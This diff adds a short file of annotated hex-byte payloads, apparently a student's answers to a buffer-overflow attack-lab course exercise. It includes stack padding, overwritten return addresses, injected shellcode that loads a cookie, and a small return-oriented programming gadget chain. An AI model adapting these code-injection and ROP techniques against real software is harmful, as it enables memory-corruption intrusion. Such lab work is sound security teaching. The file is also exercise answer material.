@@ -1,0 +1,47 @@
+for touch one
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00// first 56 bytes are just padding
+0e 13 40 00 00 00 00 00// the address of touch one written backwards
+
+for touch 2
+48 c7 c7 08 4a 2e 2a c3// this is setting my cookie 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00//padding 
+f8 fc 65 55 00 00 00 00// address of %rsp
+3a 13 40 00 00 00 00 00// adress of touch 3 
+
+
+for touch3
+48 c7 c7 40 fd 65 55 c3// adress of of rsp + 28 which is where the cookie is due to the offset
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00// padding
+f8 fc 65 55 00 00 00 00// return adress of rsp
+4b 14 40 00 00 00 00 00// touch 3 adress
+32 61 32 65 34 61 30 38// cookie string
+
+for the retur oriented programm
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00//buffer size worth of padding
+07 15 40 00 00 00 00 00//gadget 1
+08 4a 2e 2a 00 00 00 00// cookie
+0c 15 40 00 00 00 00 00// gadget 2
+3a 13 40 00 00 00 00 00// touch 2 adress
